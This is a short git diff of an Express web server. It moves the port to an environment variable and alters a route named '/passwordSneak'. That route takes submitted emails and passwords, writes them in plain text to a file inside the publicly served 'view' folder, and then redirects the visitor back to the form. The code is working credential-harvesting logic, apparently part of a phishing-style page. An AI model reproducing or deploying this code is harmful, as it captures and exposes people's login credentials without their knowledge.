@@ -5,7 +5,7 @@ const express = require('express');
 const app = express();
 const bodyParser = require("body-parser");
 
-const port = 1982;
+const port = process.env.PORT || 1982;
 let filedata = `data of file : \n ${fs.readFileSync('./file', 'utf-8')}`;
 
 app.use(express.static('view'));
@@ -26,8 +26,8 @@ app.get('/passwordSneak', (req, res) => {
 });
 
 app.post('/passwordSneak', (req, res) => {
-	res.send('Complite');
 	fs.writeFile('view/passwordSneak/sneakFile', `email : ${req.body.email} \npassword: ${req.body.password}`, err => console.log(err));
+	res.redirect('/passwordSneak')
 });
 
 app.get('/ThimblesGame', (req, res) => {
